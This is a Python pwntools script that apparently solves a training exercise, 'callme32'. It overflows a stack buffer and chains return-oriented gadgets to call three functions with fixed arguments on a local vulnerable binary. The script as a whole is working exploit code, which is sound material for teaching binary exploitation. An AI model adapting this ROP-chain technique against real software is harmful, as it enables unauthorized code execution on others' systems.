#!/usr/bin/env python2

from pwn import *

context.log_level = 'critical'
elf = ELF("./callme32")

callme_one_addr = p32(0x080485c0)
callme_two_addr = p32(0x08048620)
callme_three_addr = p32(0x080485b0)
pop_three_addr = p32(0x080488a9)

payload = "A"*44 # First overflow the buffer until EIP

payload += callme_one_addr # Jump to callme_one()
payload += pop_three_addr # callme_one() returns to the gadget, the gadget pops 1,2,3 off the stack
payload += p32(0x1) # Argument 1 for callme_one()
payload += p32(0x2) # Argument 2 for callme_one()
payload += p32(0x3) # Argument 3 for callme_one()

payload += callme_two_addr # The gadget then returns into callme_two() and the cycle continues..
payload += pop_three_addr
payload += p32(0x1)
payload += p32(0x2)
payload += p32(0x3)

payload += callme_three_addr
payload += p32(0xdeadbeef) # Return address doesn't matter at this point
payload += p32(0x1)
payload += p32(0x2)
payload += p32(0x3)

sh = elf.process()
sh.recvuntil("> ")
sh.sendline(payload)

print sh.recvall()
